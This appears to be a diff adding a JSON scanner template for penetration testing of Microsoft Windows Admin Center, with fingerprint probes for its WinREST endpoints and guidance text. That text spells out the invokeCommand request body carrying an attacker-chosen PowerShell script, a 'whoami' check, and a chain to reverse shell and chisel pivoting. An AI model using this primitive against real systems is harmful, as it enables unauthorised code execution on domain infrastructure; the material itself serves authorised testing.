@@ -1,0 +1,60 @@
+{
+  "category": "windows_admin_center",
+  "description": "Microsoft Windows Admin Center (WAC) — post-authentication PowerShell command execution via the WinREST invokeCommand API (/api/WinREST/PowerShell/nodes/<node>/invokeCommand). The `script` property runs arbitrary PowerShell on the managed node as the WAC-connected identity. Detection-only fingerprints; command execution is operator-supervised (manual_chain). WAC gateway default port 6516; internal/HTB deployments commonly 6600/443.",
+  "craft_guidance": [
+    "1. FINGERPRINT: WAC gateway usually on 6516 (or a custom port such as 6600). TLS site titled 'Windows Admin Center'; static assets under /wac/ ; REST under /api/WinREST/. Login is Windows-integrated (NTLM/Negotiate) or forms.",
+    "2. AUTH: invokeCommand is POST-auth — you need a valid WAC session (captured cookie/Authorization, or Negotiate as the current user). This is abuse of an over-privileged management feature, not a pre-auth bug; rate the finding on what the authenticated principal can reach (typically SYSTEM on the managed node).",
+    "3. EXEC PRIMITIVE: POST /api/WinREST/PowerShell/nodes/<node>/invokeCommand with a JSON body whose properties.script is attacker-controlled: {\"properties\":{\"script\":\"<powershell>\",\"command\":\"Get-WACServerConnectionsState\",\"module\":\"Microsoft.Management.ServerManager\",\"state\":\"Polling\",\"useInProcRunspace\":false,\"invokeMode\":\"Polling\"}}. <node> is the managed target (e.g. 'dc').",
+    "4. BENIGN CONFIRMATION FIRST (Rule 5): set script to `$env:COMPUTERNAME; whoami` and read the polled result — proves arbitrary PowerShell on the node without dropping a shell. Only escalate to a reverse shell / -EncodedCommand payload when RoE permits foothold establishment (SOC-loud).",
+    "5. IMPACT: the script runs on the managed node in the WAC service context — on a DC-managed node this is code execution against domain infrastructure. Chain: WAC session -> invokeCommand RCE -> on-host recon -> internal service discovery (netstat) -> pivot (chisel) into localhost-bound services."
+  ],
+  "contexts": {
+    "wac_powershell_rce_invokecommand": {
+      "description": "Windows Admin Center WinREST invokeCommand PowerShell execution. The properties.script field is executed as PowerShell on the managed node. Detection = confirm the WinREST PowerShell surface is present; the script payload is operator-supervised (manual_chain) and requires a valid WAC session.",
+      "tech_match": ["windows admin center", "wac", "winrest", "microsoft.management.servermanager"],
+      "param_match": ["script", "command", "module", "invokeMode"],
+      "probes": [
+        {
+          "payload": "/api/WinREST/PowerShell/nodes/dc/invokeCommand",
+          "description": "WinREST PowerShell invokeCommand endpoint present (WAC/WinREST markers or an auth challenge) confirms the command-execution surface. Fingerprint only — no script property sent. With a valid WAC session, run the benign confirmation from craft_guidance step 4.",
+          "matchers": [
+            {"type": "status", "status": [200, 401, 403, 400, 405]},
+            {"type": "word", "words": ["WinREST", "invokeCommand", "runspace", "Microsoft.Management", "WACServerConnectionsState", "PowerShell"], "in": "body", "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55,
+          "variables": {"path_override": true, "manual_chain": true}
+        }
+      ]
+    },
+    "wac_product_fingerprint": {
+      "description": "Windows Admin Center gateway fingerprint — confirms a WAC deployment (management plane worth authenticating against for the invokeCommand RCE surface).",
+      "tech_match": ["windows admin center", "wac"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/wac/",
+          "description": "WAC static application root present (Windows Admin Center markers) — management gateway confirmed.",
+          "matchers": [
+            {"type": "status", "status": [200, 301, 302, 401]},
+            {"type": "word", "words": ["Windows Admin Center", "wac-", "sme-app", "ServerManager"], "in": "body", "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {"path_override": true}
+        },
+        {
+          "payload": "/api/WinREST/nodes",
+          "description": "WinREST node inventory endpoint — confirms the WAC REST plane and enumerates candidate managed nodes for invokeCommand.",
+          "matchers": [
+            {"type": "status", "status": [200, 401, 403]},
+            {"type": "word", "words": ["WinREST", "nodes", "connectionType", "Microsoft.Management"], "in": "body", "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {"path_override": true, "manual_chain": true}
+        }
+      ]
+    }
+  }
+}
